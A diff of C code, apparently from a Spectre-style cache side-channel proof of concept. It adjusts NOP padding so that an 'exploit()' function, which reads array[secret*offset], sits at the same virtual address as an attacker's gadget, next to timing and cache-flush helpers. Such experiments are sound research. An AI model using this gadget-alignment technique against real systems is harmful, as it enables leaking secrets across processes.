@@ -21,15 +21,20 @@ inline void timeAndFlush(ADDR_PTR addr) {
 	// clflush((void *)addr);
 }
 
-volatile void spacer2() {
+volatile void spacer() {
 	asm(
-		".rept 915;"
+		".rept 2182;"
 		"nop;"
 		".endr;"
 	);
 }
 
-void exploit();
+void exploit() { 
+	// this should be at the same VA as attacker:gadget()
+	// volatile int temp = array[secret*offset];
+	volatile int temp = array[secret*offset];
+	// clflush((void*)(&array[secret*offset]));
+}
 
 void trickMe() {
 	// while(1) {
@@ -57,22 +62,6 @@ void trickMe() {
 			: "=r" (tmp)
 		);
 	}
-}
-
-volatile void spacer() {
-	asm(
-		// ".rept 1000;"
-		".rept 957;"
-		"nop;"
-		".endr;"
-	);
-}
-
-void exploit() { 
-	// this should be at the same VA as attacker:gadget()
-	// volatile int temp = array[secret*offset];
-	volatile int temp = array[secret*offset];
-	// clflush((void*)(&array[secret*offset]));
 }
 
 int main(){
